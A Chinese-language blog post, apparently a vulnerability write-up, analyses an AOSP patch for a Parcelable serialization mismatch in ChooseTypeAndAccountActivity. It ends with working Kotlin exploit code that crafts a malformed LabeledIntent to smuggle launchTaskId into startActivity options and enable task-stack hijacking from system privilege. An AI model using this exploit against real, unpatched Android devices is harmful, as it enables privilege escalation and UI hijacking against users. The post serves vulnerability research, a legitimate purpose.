> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [konata.github.io](https://konata.github.io/posts/creator-mismatch/)

> Prologue

Prologue[](#prologue)
---------------------

今年年初的时候， AOSP 公布了一个看起来很奇怪的 [patch](https://android.googlesource.com/platform/frameworks/base/+/d0bc9026e2e62e09fa88c1bcbf1dc1c3fb001375%5E%21/#F0)

```
final Intent intent = (Intent)accountManagerResult.getParcelable(AccountManager.KEY_INTENT);
   if (intent != null) {
     mPendingRequest = REQUEST_ADD_ACCOUNT;
     mExistingAccounts = AccountManager.get(this).getAccountsForPackage(mCallingPackage, mCallingUid);
     intent.setFlags(intent.getFlags() & ~Intent.FLAG_ACTIVITY_NEW_TASK);
-    startActivityForResult(intent, REQUEST_ADD_ACCOUNT);
+    startActivityForResult(new Intent(intent), REQUEST_ADD_ACCOUNT);
     return;
   }
```

观察 Intent 的构造函数，除了每个字段逐个赋值外并没有额外的操作，这代码看起来在夏姬八写, 再从其他地方看一下漏洞描述，只有简单的说是和 Unsafe Deserialization 相关的越权，也没有更深的线索， 注意到关键字 `序列化`，`越权`，那么可以跟到 AIDL 调用处理的位置看看

AIDL[](#aidl)
-------------

startActivityForResult 到最后和服务端的交互是通过 IActivityTaskManager.startActivity, 即[这里](https://cs.android.com/android/platform/superproject/main/+/main:out/soong/.intermediates/frameworks/base/framework-minus-apex-intdefs/android_common/xref36/srcjars.xref/android/app/IActivityTaskManager.java;drc=47fffdd53115a9af1820e3f89d8108745be4b55d;l=2032)

```
// Proxy
      @Override public int startActivity(android.app.IApplicationThread caller, java.lang.String callingPackage, java.lang.String callingFeatureId, android.content.Intent intent, java.lang.String resolvedType, android.os.IBinder resultTo, java.lang.String resultWho, int requestCode, int flags, android.app.ProfilerInfo profilerInfo, android.os.Bundle options) throws android.os.RemoteException
      {
        android.os.Parcel _data = android.os.Parcel.obtain(asBinder());
        android.os.Parcel _reply = android.os.Parcel.obtain();
        int _result;
        try {
          _data.writeInterfaceToken(DESCRIPTOR);
          _data.writeStrongInterface(caller);
          _data.writeString(callingPackage);
          _data.writeString(callingFeatureId);

          // ⬇️
          _data.writeTypedObject(intent, 0);
          // ⬆️

          _data.writeString(resolvedType);
          _data.writeStrongBinder(resultTo);
          _data.writeString(resultWho);
          _data.writeInt(requestCode);
          _data.writeInt(flags);
          _data.writeTypedObject(profilerInfo, 0);
          _data.writeTypedObject(options, 0);
          boolean _status = mRemote.transact(Stub.TRANSACTION_startActivity, _data, _reply, 0);
          _reply.readException();
          _result = _reply.readInt();
        }
        finally {
          _reply.recycle();
          _data.recycle();
        }
        return _result;
      }


     // Stub.onTransact
     case TRANSACTION_startActivity:
        {
          android.app.IApplicationThread _arg0;
          _arg0 = android.app.IApplicationThread.Stub.asInterface(data.readStrongBinder());
          java.lang.String _arg1;
          _arg1 = data.readString();
          java.lang.String _arg2;
          _arg2 = data.readString();
          android.content.Intent _arg3;

          // ⬇️
          _arg3 = data.readTypedObject(android.content.Intent.CREATOR);
          // ⬆️

          java.lang.String _arg4;
          _arg4 = data.readString();
          android.os.IBinder _arg5;
          _arg5 = data.readStrongBinder();
          java.lang.String _arg6;
          _arg6 = data.readString();
          int _arg7;
          _arg7 = data.readInt();
          int _arg8;
          _arg8 = data.readInt();
          android.app.ProfilerInfo _arg9;
          _arg9 = data.readTypedObject(android.app.ProfilerInfo.CREATOR);
          android.os.Bundle _arg10;
          _arg10 = data.readTypedObject(android.os.Bundle.CREATOR);
          data.enforceNoDataAvail();
          int _result = this.startActivity(_arg0, _arg1, _arg2, _arg3, _arg4, _arg5, _arg6, _arg7, _arg8, _arg9, _arg10);
          reply.writeNoException();
          reply.writeInt(_result);
          break;
        }
```

```
public final <T extends Parcelable> void writeTypedObject(@Nullable T val,
            int parcelableFlags) {
        if (val != null) {
            writeInt(1);

            // ⬇️
            val.writeToParcel(this, parcelableFlags);
            // ⬆️

        } else {
            writeInt(0);
        }
    }

    public final <T> T readTypedObject(@NonNull Parcelable.Creator<T> c) {
        if (readInt() != 0) {

          // ⬇️
          return c.createFromParcel(this);
          // ⬆️

        } else {
          return null;
        }
    }
```

AIDL 做代码生成时, 对于 Parcelable 类型的参数，因为类型是编译时已知的，生成的 Stub 代码中都是用 readTypedObject(Type.Creator) 来直接读入的，

而 ArrayMap / Bundle 中如果包含 Parcelable，则是先读出实际类型的字符串，再反射找到对应类或其父类的 Creator (使用 getField), 然后调用 Creator 的 static 方法 createFromParcel 来实现反序列化，

前者可以减少数据传输大小，且不需要反射提高了运行效率, 但是这样做可能存在一定的安全风险

Mismatch[](#mismatch)
---------------------

到这里答案就已经呼之欲出了，AIDL 在写入的时候，使用的是运行时类型的实例方法 `writeToParcel`, 而读入的时候使用声明类型的 Creator 字段的 `readFromParcel`, 这两个方法本来就不是配对的. 如下图, 我们传入的参数是 `A` 的子类 `A'`, 写入时因为 virtual-dispatch, 会按照 `A'` 规则写入，然而读出的时候确是按照 `A` 的规则来读，有一个多出的字段混淆到参数`B`里面去了

> 以下是 AIDL 声明为 `foo(A, B)`, 实际调用为 `foo(A', B)` 的序列化示意图

[![](https://konata.github.io/assets/images/mismatch.png)](https://konata.github.io/assets/images/mismatch.png)

SDK 中存在两个 Intent 的子类，`ReferrerIntent` 和 `LabeledIntent` ，其实现都是先写入了父类 `Intent` 的所有字段，然后添加了自己的私有字段, 如果用这两个类型作为 Intent 的参数，那么 startActivity 调用中位于 Intent 位置后的参数我们就都可以污染

Parcel 101[](#parcel-101)
-------------------------

为了能顺利理解后面的利用过程 , 需要对常见数据类型使用 Parcel 序列化时对应的规则有一些了解, 其代码实现都在 [Parcel.cpp](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/native/libs/binder/Parcel.cpp) 中

### Parcel.writeByteArray(bytes)[](#parcelwritebytearraybytes)

*   如果 bytes 是 null, 写入 i32 的 -1,
*   否则按照 i32 写入 bytes 的长度, 然后写入 bytes 的所有内容, 之后需要对内容做四字节对齐, 需要补齐的一到三个字节全部补 0x00

[![](https://konata.github.io/assets/images/bytearray.png)](https://konata.github.io/assets/images/bytearray.png)

### Parcel.writeString8(str)[](#parcelwritestring8str)

*   如果 str 是 null, 写入 i32 的 -1,
*   否则按照 i32 写入 str 的长度, 然后依次写入每个字符, 再添加 \0 作为结尾, 最后按照 4 字节对齐, 需要补充的一到三个字符全部补 0x00

[![](https://konata.github.io/assets/images/string8.png)](https://konata.github.io/assets/images/string8.png)

### Parcel.writeString16(str)[](#parcelwritestring16str)

*   如果 str 是 null, 写入 i32 的 -1,
*   否则按照 i32 写入字符串长度, 然后按照 char16_t 写入每个字符, 最后添加 0x0000 作为结尾, 整个按照 4 字节对齐, 如需要补齐, 再补 0x0000

[![](https://konata.github.io/assets/images/string16.png)](https://konata.github.io/assets/images/string16.png)

### Parcel.writeStrongBinder(binder)[](#parcelwritestrongbinderbinder)

binder 的正常写入是 [28 个字节](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/native/libs/binder/Parcel.cpp;drc=418914a7c54f4aa0418b6ddbb5096b66286cd80e;l=240), 对应于 一个 flat_binder_object 加上 i32 的 stability 的标志位, flat_binder_object 定义如下

```
struct flat_binder_object {
  struct binder_object_header hdr; // a.k.a u32
  __u32 flags;
  union {
    binder_uintptr_t binder; // a.k.a u64
    __u32 handle;
  };
  binder_uintptr_t cookie; // a.k.a u64
};
```

如果读入的时候如果出现错误, 比如 hdr 字段读出来不是预设的两个值 (`BINDER_TYPE_BINDER` | `BINDER_TYPE_HANDLER`), 或者该区间数据在 Parcel.mObjects 中没有被记录为一个 Binder 等, 则上层拿到的 binder 是 null, 且此时不会继续调用 [finishUnflattenBinder](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/native/libs/binder/Parcel.cpp;drc=397dd78fcdcfed36ee62302e2b90712e2d784364;l=188), 所以不会继续读 stability 字段, 此时仅消耗了 24 个字节,

[![](https://konata.github.io/assets/images/binder.png)](https://konata.github.io/assets/images/binder.png)

如上图, 我们在将一个正常的 Binder 写入后, 将 dataPosition 设置为 binder 之前的位置. 然后连续 7 次调用 readInt 方法来读取刚刚写入的 28 个字节对应的 mData. 此时前 24 个字节本应是 binder. 然而如果使用了 readInplace、readAligned 或 read 等方法 (readInt 间接调用了 readInplace) 来读取对应的 mData，将会触发 [validateReadData](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/native/libs/binder/Parcel.cpp;drc=418914a7c54f4aa0418b6ddbb5096b66286cd80e;l=1722) 的检查逻辑. 该逻辑通过查看 Parcel 的 mObjects 记录确定读取的区域是否是 binder. 如果是的话校验将无法通过，返回 0. 最后四个字节是 stability，可以正常读取。

总结一下, binder 在 Parcel.mData 中的偏移在 Parcel.mObjects 中都有记录, 使用 readStrongBinder 读取非标记为 binder 的 mData 区间或使用非 readStrongBinder 读取标记为 binder 的区间, 得到的结果都不是我们预期的

### Parcel.writeTypedObject(…)[](#parcelwritetypedobject)

*   如果是 null, 写入 i32 的 0
*   否则写入 i32 的 1, 并按照对应 Parcelable 子类的实现依次写入其他内容

[![](https://konata.github.io/assets/images/user-handle.png)](https://konata.github.io/assets/images/user-handle.png)

### Parcel.writeTypedObject(bundleOf(…))[](#parcelwritetypedobjectbundleof)

Bundle 本身只是 Parcelable 的一种实现而已, 但是因为太常用, 这里单独说明一下他自身的序列化实现

*   如果内部的 map 是 null 或者 size 是 0, 写入 i32 的 0
*   否则
    
    1.  使用 i32 写入内部 ArrayMap 在序列化之后占用的整个长度 (back-patch-length)
    2.  使用 i32 写入魔数 0x4C444E42 // BNDL
    3.  使用 i32 写入 map 的 entry 数量
    4.  使用 String16 写入 key 的内容
    5.  使用 i32 写入 value 的类型
    6.  按照 value 的运行时类型, 写入 value 的序列化内容
    7.  重复 4,5,6 直到写完所有的 entry
    
    [![](https://konata.github.io/assets/images/bundle.png)](https://konata.github.io/assets/images/bundle.png)
    
    上图的前四个字节是按照 TypedObject 写入的 i32 的 1
    

### Parcel.enforceNoDataAvail[](#parcelenforcenodataavail)

Android 13 引入了一个新的 API `Parcel.enforceNoDataAvail`, 用于缓解一些序列化不对称的利用, AIDL 工具在对 aidl 文件做代码生成的时候, 会在 onTransact 的每个分支里面加上这个调用, 确保对端传来的 Parcel 的数据会被读完, 否则会直接抛异常

```
case TRANSACTION_startActivity:
        {
          ....

          android.app.ProfilerInfo _arg9;
          _arg9 = data.readTypedObject(android.app.ProfilerInfo.CREATOR);
          android.os.Bundle _arg10;
          _arg10 = data.readTypedObject(android.os.Bundle.CREATOR);

          // ⬇️
          data.enforceNoDataAvail();
          // ⬆️

          int _result = this.startActivity(_arg0, _arg1, _arg2, _arg3, _arg4, _arg5, _arg6, _arg7, _arg8, _arg9, _arg10);
          reply.writeNoException();
          reply.writeInt(_result);
          break;
        }
```

```
public void enforceNoDataAvail() {
        final int n = dataAvail();
        if (n > 0) {
            throw new BadParcelableException("Parcel data not fully consumed, unread size: " + n);
        }
   }
```

Authenticator[](#authenticator)
-------------------------------

在了解了原理以及前置知识之后，来整理一下利用过程，patch 是补在 [ChooseTypeAndAccountActivity.java](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/accounts/ChooseTypeAndAccountActivity.java), 因为其身份是 [`SYSTEM_UID`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/res/AndroidManifest.xml;drc=422648fdfad684086abf90141739a090fc818787;l=6691) (进程是 android:ui 而不是 system_process), 是静默提权的最常见路径，正常的业务是这样

1.  App 在 manifest 里面注册自己的 AccountType， 并实现 `AccountAuthenticator`
2.  App 主动调用 `ChooseTypeAndAccountActivity`，传入 自己的 AccountType 让其根据 AccountType 来添加账号
3.  `ChooseTypeAndAccountActivity` 向 `AccountManagerService` 请求添加对应 AccountType 的 Intent， `AccountManagerService` 根据注册信息找到我们的 AccountAuthenticator， IPC 调用 AccountAuthenticator 中的 `addAccount`方法, 拿到了一个 Bundle, 里面包含一个 key 为 `AccountManager.KEY_INTENT`, value 为指引调用方添加对应账号的 Intent 的项
4.  `AccountManagerService` 从 Bundle 中取出 Intent 后做了一大堆详尽的[检查](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/services/core/java/com/android/server/accounts/AccountManagerService.java;drc=47fffdd53115a9af1820e3f89d8108745be4b55d;l=4895), 确认该 Intent 没有危险之后，把刚才的整个 Bundle 返回给 `ChooseTypeAndAccountActivity`
5.  `ChooseTypeAndAccountActivity` 从 Bundle 中取出 Intent，使用 `startActivityForResult()` 调用该 Intent

LaunchTaskId[](#launchtaskid)
-----------------------------

考虑到 Intent 本身已经经过了 `checkKeyIntent` 的搜身，以及上文的分析，这次要利用的就是 `IActivityTaskManager.startActivity` 调用中 Intent 位置后面的参数, 分析一下可能存在利用的参数

*   `resolvedType` -> 可以影响 intent 的 resolve 流程，但是这个参数本身就是由 intent 得出的，可以控制 intent 的前提下已经可以控制他了，所以没有意义
    
*   `resultTo` -> 是个 Binder, Binder 在 Parcel 的 mObjects 中也有位置记录，所以只是修改这个值还不行，同时我个人没想到修改他之后可以怎么利用
    
*   `resultWho` -> 没太大用
    
*   `requestCode` -> 没太大用
    
*   `flags` -> 注意这个不是 Intent 的 flag，而是一个告诉 AMS 是否需要启动调试模式来打开对应的 Activity 的 flag， 哪天需要调试一个 app 的时候再来用
    
*   `profilerInfo` -> 性能数据相关，没具体看
    
*   `options` -> 也是个 Bundle，一般是转成 ActivityOptions 再用，里面有非常多的选项，比如如果能设置 launchTaskId，就可以把我们的 Activity 启动到任意堆栈，实现任务栈劫持, 决定了, 就是它
    

LabeledIntent[](#labeledintent)
-------------------------------

如前文所说，Intent 有两个子类 `LabeledIntent` 和 `ReferrerIntent`， 其中 `ReferrerIntent` 只比 Intent 多了一个 String 字段，而 startActivity AIDL 调用中 intent 参数接下来是 `resolvedType`, 也是 String， 刚好会把 `ReferrerIntent` 多余的字段给抵消掉，导致后续只能用 `ChooseTypeAndAccountActivity` 自己设置的参数通过错位来攻击自己，难度挺大

分析下 `LabeledIntent` 相对于 Intent 写多的[字段](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/text/TextUtils.java;drc=9a6274388299f6a3032c18b9797f56ece313b389;l=794)

```
public void writeToParcel(Parcel dest, int parcelableFlags) {
    super.writeToParcel(dest, parcelableFlags);
    dest.writeString(mSourcePackage); // 1
    dest.writeInt(mLabelRes); // 2
    TextUtils.writeToParcel(mNonLocalizedLabel, dest, parcelableFlags); // 3
    dest.writeInt(mIcon); // 4
}
```

*   `mSourcePackage` 按照 String16 写入
*   `labelRes` 按照 i32 写入
*   `mNonLocalizedLabel`, 是一个 CharSequence, 使用 `TextUtils.writeToParcel` 来序列化, 比较复杂的一个类, 按照内容是否是 Spanned, 可以简单的分为两条路径写入
    
    > 路径一
    
    1.  按照 i32 写入 数字 1， 表示下面的内容不是 Spanned， 而是普通字符
    2.  按照 String8 写入字符串内容
    
    > 路径二
    
    1.  按照 i32 写入数字 0，表示下面的内容是 Spanned
    2.  按照 String8 写入字符串内容
    3.  按照以下格式依次写入每个 ParcelableSpan 的子类
        1.  按照 i32 写入这个 ParcelableSpan 的 StyleId (表示下面为哪种 Span，比如后面使用的 URLSpan 对应的 Id 是 11)
        2.  按照 ParcelableSpan 自己的子类实现，写入 ParcelableSpan 自身 (有 29 种可能)
        3.  依次写入这个 ParcelableSpan 的开始位置，结束位置，flags 等三个信息， 均按照 i32 格式写入
    4.  按 i32 格式写入 数字 0
*   `mIcon` 按照 i32 写入

路径一 看似比较简单, 仅需把需要的参数写入这个 String8 的前一段, 然后组装一个 Bundle

1.  向 Bundle 中写入 `launchTaskId` 为 key，需要插入的堆栈 id 为 value 的 entry,
2.  向 Bundle 中写入 `_` 为 key， ByteArray 为 value 的 entry， 这个 ByteArray 的长度需要特别计算， 用来消耗掉 Parcel 里面剩余的所有数据
3.  根据上面 ByteArray 计算得到的长度, 调整 Bundle 里面的 back-patch length,
4.  把这个不完整的 Bundle 整个作为 String8 字符串的后段，同时调整 String8 的长度使其合法

之后得到的 String8 字符串就是 payload, 然而在实际编码的过程中, String8 有一个极大的坑, 就是读入的时候会对 String8 的合法性做一定的检查, 如果中间存了太多的 0, 从 `ChooseTypeAndAccountActivity` 请求到 `AMS` 序列化 `LabeledIntent`的时候, 会写成一个空字符串, 导致 payload 丢失, 相比之下 String16 则几乎不存在类似的坑, 所以这里选择相对复杂一点的路径二, 同时选择 `android.text.style.URLSpan` 作为 ParcelableSpan 的子类, 因为里面会有一个 String16

Contraption[](#contraption)
---------------------------

现在来模拟一下 AMS 的整个读入过程

1.  AMS 读取 `resolvedType`, 实际读入 LabeledIntent 里面 `mSourcePackage`
2.  AMS 读取 `resultTo`(24 字节), 对应于 LabeledIntent 里面的 `labelRes` (4 字节), `mNonLocalizedLabel` 中的第一个表示 kind 的 i32(4 字节), `mNonLocalizedLabel` 的长度 (4 字节), `mNonLocalizedLabel` 的字符串内容以及结束符 (“@@@\NUL” => 4 字节), URLSpan 的 `StyleId` (4 字节), `URLSpan` 内容字符串的长度 (4 字节)
3.  AMS 读取 `resultWho`, 对应于以 URLSpan 内容字符串前四个字节为长度的 String16
4.  AMS 读取 `requestCode`(4 字节), 我们让他继续在 URLSpan 内容字符串中读取, 并且保证读出来的数字为 0
5.  AMS 读取 `flags` (4 字节), 同上, 并且保证都出来的数字为 0
6.  AMS 读取 `profilerInfo`, 同上, 并且保证都出来的数据为 null
7.  AMS 读取 `options`, 我们保证这个位置的数据是符合 Bundle 格式的开始, 并且 bundle 中包含了想要设置的 launchTaskId 的 entry, 和一个 key 为 ‘_’, value 为 精心设计了长度的 ByteArray 的 entry, 当 URLSpan 的内容字符串被读完之后, 确保还没有达到 ByteArray 设置的长度
8.  AMS 把后面的数据当做 ByteArray 的内容继续读取, 对应于 `mNonLocalizedLabel` 最后的标识数字 0, LabeledIntent 里面的 `mIcon`(0), ChooseTypeAndAccountActivity 本身提供的 `resolvedType`(null@String16), `resultTo`(28 字节), `resultWho`(null), `requestCode`(i32), `flags`(i32), `profilerInfo`(null), `options`(null) 等
9.  到这里 ByteArray 需要刚好读取完成，同时由于 bundle 里面只有两个 key，所以 options 也刚好读完，而 options 又是该 AIDL 调用的最后一个参数，所以整个 Parcel 需要刚好被消耗光， 保证了 Parcel.enforceNoDataAvail 不会在 AMS 里面抛异常

第 8 步中由于读取的 ByteArray 中包含了一个 binder 的位置 (前面说过，Parcel 的 mObjects 中记录了所有 binder 在 mData 中的偏移)， 过不了 `validateReadData`校验， 所以最后上层会读出来一个空的 ByteArray, 但是不会抛错，并且也消耗完了 Parcel 的整个数据，所以对我们的后续操作无影响

于是可以构造下面的利用代码，虽然烦琐，但是直观，其中几个 fixme 的部分是需要计算的长度

```
fun contraption(): LabeledIntent {
        val intent = Parcel.obtain().apply {
          intentFor<LoginActivity>().setAction("hello").writeToParcel(this, 0)
        }

        val taskId = 218

        val tail = Parcel.obtain().apply {
          writeString(null) // mSourcePackage => resolvedType
          writeInt(0) // labelRes  => hdr

          writeInt(0) // kind1 => flags
          writeString8("AAA") // text => binder
          writeInt(11) // TextUtils.URL_SPAN => cookie.1

          run {
            writeInt(fixme(63)) // URLSpan.mURL text len => cookie.2

            // we don't have a valid type ( sb*| sh* ), so no stability is read
            // writeInt(65)  // ? => ?stability

            writeString(null) //  URLSpan.mURL.chars.01 => resultWho(null)
            writeInt(77) // URLSpan.mURL.chars.23 => requestCode
            writeInt(88) // URLSpan.mURL.chars.45 => flags
            writeInt(0) // URLSpan.mURL.chars.67 => profilerInfo(null)
            run {
              writeInt(1) // URLSpan.mURL.chars.89 => options != null

              writeInt(fixme(172)) //  URLSpan.mURL.chars.1.01  =>  back patch length
              writeInt(Const.BundleMagic)  // URLSpan.mURL.chars.1.23 => 'B' 'N' 'D' 'L'
              writeInt(2) // URLSpan.mURL.chars.1.45 => entry count

              // URLSpan.mURL.chars going on ...
              writeString("android.activity.launchTaskId") //  key 1
              writeValue(taskId) // value 1
              writeString("_") // key 2
              run {  // value 2
                writeInt(Const.ValByteArray) // VAL_BYTEARRAY
                writeInt(fixme(80)) // byte array length
                writeInt('@'.code) //  0 <-- byte array content start here
                writeInt(0) // <--- URLSpan.mURL.chars ends here with terminator
              }
            }

            // byte array content going on ...
            writeInt(1) // span.start
            writeInt(2) // span.end
            writeInt(3) // span.flags
            writeInt(0) // end flag
          }

          // byte array content going on ...
          writeInt(0) // Icon
        }

        val labeled = Parcel.obtain().apply {
          appendFrom(intent, 0, intent.dataSize())
          appendFrom(tail, 0, tail.dataSize())
        }

        labeled.setDataPosition(0)
        return LabeledIntent.CREATOR.createFromParcel(labeled)
      }
```

通过上面的代码，我们就构造出了合法的 LabeledIntent， 当它连接上 startActivity 的其他参数， 并且被当做 Intent 反序列化之后，就可以达到了修改 launchTaskId , 最后把我们的 Activity 启动到某个存在的系统的 Activity 堆栈中，之后就可以用堆栈劫持技巧做攻击了

Epilogue[](#epilogue)
---------------------

总结一下在构造 Exp 的过程中值得注意的点

*   如果读取到 binder 的 hdr 不为预设的两个 header, 则会返回 null 作为 binder 的值, 但是这时候不会去读 binder 的 stability, 导致整个 null binder 只消耗掉 24 个字节而不是正常的 28 个字节
*   在使用 readInPlace 读取一段连续数据之后, 会检查该 Parcel 对应的这段数据是否关联了 binder, 如果是的话, 虽然数据会被消耗, 但是上层只能拿到 nullptr 作为读取内容,
*   String8 格式写入字符串之后, 对端在读入时会对 String8 的合法性做校验, 这也是为什么我们不把 mNonLocalizedLabel 序列化为看起来更为简单的路径一的原因, 我们需要在里面藏入太多的 payload, 很难保证这段 payload 同时也是合法的 String8 编码的字符串, 比如中间加了很多的 0 就会导致校验失败, 而 String16 就没有对应的校验
*   上面构造的 bundle 我们需要保证 ByteArray 是在后面被序列化， 虽然 Bundle 本身是无序的，但是实际山使用 key 的 hashCode 来做顺序，我们需要谨慎的选择这个 key，这里的 ‘_’, 就能达到这个要求

这个漏洞出现的根本原因，在于 Parcelable 的实现类存在子类，然后父类被用在了 aidl 参数中，基于这种模式，我们可以利用 codeql 批量查询 AOSP 中存在的这种类以及对应的 aidl 接口，我简单的试了一下，结果集中在 Uri 和 SavedState，遗憾的是并没有找到可以利用的点，其中 Uri 的子类共用一个 Creator，这个 Creator 中考虑了所有可能的子类的序列化情况